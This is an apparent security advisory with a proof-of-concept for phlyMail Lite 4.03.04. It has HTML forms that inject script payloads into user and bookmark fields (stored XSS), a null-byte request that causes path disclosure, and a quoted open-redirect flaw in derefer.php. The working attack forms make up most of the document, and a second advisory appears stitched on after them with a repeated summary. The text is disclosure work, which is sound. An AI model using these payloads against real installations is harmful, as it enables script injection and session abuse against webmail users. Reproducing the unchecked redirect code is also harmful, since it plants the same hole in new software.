 
phlyLabs phlyMail Lite 4.03.04 Path Disclosure and Stored XSS Vulnerabilities
 
 
Vendor: phlyLabs
Product web page: http://www.phlymail.com
Affected version: Lite 4.03.04
 
Summary: phlyMail offers you an interface in the browser to have access
to your emails, contacts, appointments, tasks, files and bookmakrs from
anyhwere, where you have internet access. This can be your home, workplace,
train station, abroad, offroad, in the woods or your own backyard.
 
Desc: phlyMail suffers from multiple stored XSS vulnerabilities (post-auth)
and Path Disclosure when input passed via several parameters to several scripts
is not properly sanitized before being returned to the user. This can be exploited
to execute arbitrary HTML and script code in a user&#039;s browser session in context
of an affected site and displaying the full webapp installation path.
 
 
Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
           Apache 2.4.2 (Win32)
           PHP 5.4.4
           MySQL 5.5.25a
 
 
Vulnerability discovered by Gjoko &#039;LiquidWorm&#039; Krstic
                            @zeroscience
 
 
Advisory ID: ZSL-2013-5122
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5122.php
 
 
13.01.2013
 
-->
 
 
<html>
<head>
<title>phlyLabs phlyMail Lite 4.03.04 Path Disclosure and Stored XSS Vulnerabilities</title>
</head>
<body><center><br />
 
<form method="POST" action="http://localhost/config.php?action=users&whattodo=savenewuser">
<input type="hidden" name="MOTD" value="ZSL" />
<input type="hidden" name="PHM[active]" value="1" />
<input type="hidden" name="PHM[cellular]" value=&#039;"><script>alert(1);</script>&#039; />
<input type="hidden" name="PHM[customer_number]" value=&#039;"><script>alert(2);</script>&#039; />
<input type="hidden" name="PHM[email]" value=&#039;"><script>alert(3);</script>&#039; />
<input type="hidden" name="PHM[externalemail]" value=&#039;"><script>alert(4);</script>&#039; />
<input type="hidden" name="PHM[fax]" value=&#039;"><script>alert(5);</script>&#039; />
<input type="hidden" name="PHM[firstname]" value=&#039;"><script>alert(6);</script>&#039; />
<input type="hidden" name="PHM[lastname]" value=&#039;"><script>alert(7);</script>&#039; />
<input type="hidden" name="PHM[password2]" value="django" />
<input type="hidden" name="PHM[password]" value="django" />
<input type="hidden" name="PHM[tel_business]" value=&#039;"><script>alert(8);</script>&#039; />
<input type="hidden" name="PHM[tel_private]" value=&#039;"><script>alert(9);</script>&#039; />
<input type="hidden" name="PHM[visibility]" value="private" />
<input type="hidden" name="PHM[www]" value=&#039;"><script>alert(10);</script>&#039; />
<input type="hidden" name="debugging_level" value="0" />
<input type="hidden" name="language" value="en" />
<input type="hidden" name="sessioncookie" value="0" />
<input type="hidden" name="sessionip" value="0" />
<input type="hidden" name="showmotd" value="1" />
<input type="hidden" name="theme" value="Yokohama" />
<input type="hidden" name="uid" value=&#039;"><script>alert(11);</script>&#039; />
<input type="submit" value="XSS #1" />
</form>
 
<br />
 
<form method="POST" action="http://localhost/config.php?action=view&screen=bookmarks&module=Bookmarks&do=edititem&save=1&id=1">
<input type="hidden" name="desc" value="ZSL" />
<input type="hidden" name="group" value="1" />
<input type="hidden" name="is_favourite" value="1" />
<input type="hidden" name="name" value=&#039;"><script>alert(12);</script>&#039; />
<input type="hidden" name="url" value=&#039;"><script>alert(13);</script>&#039; />
<input type="submit" value="XSS #2" />
</form>
 
<br />
 
<form method="GET" action="http://localhost/frontend/derefer.php?go=joxy%00">
<input type="submit" value="PD #1" />
</form>
 
</center></body>
</html>

Summary: phlyMail offers you an interface in the browser to have access
to your emails, contacts, appointments, tasks, files and bookmakrs from
anyhwere, where you have internet access. This can be your home, workplace,
train station, abroad, offroad, in the woods or your own backyard.
 
Desc: Input passed via the &#039;go&#039; parameter in &#039;derefer.php&#039; script is not
properly verified before being used to redirect users. This can be exploited
to redirect a user to an arbitrary website e.g. when a user clicks a specially
crafted link to the affected script hosted on a trusted domain.
 
 
-----------------------------------------------------------------------
/frontend/derefer.php:
----------------------
 
33: if (!isset($_REQUEST[&#039;go&#039;])) exit;
35: if (strlen($go) == 0) exit;
37:
38: header(&#039;Location: &#039;.$go);
39: exit;
 
-----------------------------------------------------------------------
 
 
Tested on: Microsoft Windows 7 Ultimate SP1 (EN)
           Apache 2.4.2 (Win32)
           PHP 5.4.4
           MySQL 5.5.25a

http://localhost/frontend/derefer.php?go=zeroscience.mk

